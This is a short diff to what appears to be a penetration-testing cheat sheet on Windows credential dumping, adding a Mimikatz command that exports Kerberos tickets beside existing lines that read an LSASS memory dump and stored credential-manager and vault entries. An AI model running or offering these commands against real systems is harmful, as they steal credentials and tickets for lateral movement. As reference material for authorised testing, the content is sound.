@@ -62,6 +62,9 @@ sekurlsa::minidump C:\Temp\final.dmp
 # credential manager
 sekurlsa::credman
 vault::cred
+
+# dump tickets
+sekurlsa::tickets /export
 ```
 
 ### LSASS Dump
